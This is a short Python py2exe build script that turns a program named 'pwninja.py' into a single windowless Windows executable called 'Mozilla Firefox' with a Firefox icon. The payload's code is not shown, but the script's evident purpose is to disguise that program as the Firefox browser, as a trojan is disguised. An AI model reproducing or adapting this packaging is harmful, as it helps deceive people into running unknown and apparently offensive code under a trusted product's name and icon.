'''
Script to convert pwninja.py into an executable with firefox icon.
one of the requirement is that all the files has to be in one directory to this
script to work
Files: 'pwninja.py' , 'setup.py' , 'Firefox.ico' 
'''
from distutils.core import setup
import py2exe, sys, os

sys.argv.append('py2exe')

setup(
    options = {'py2exe': {'bundle_files': 1, 'compressed': True}},
	windows = [{
            "script":"pwninja.py",
            "icon_resources": [(1, "Firefox.ico")],
            "dest_base":"Mozilla Firefox"
            }],
    zipfile = None,
)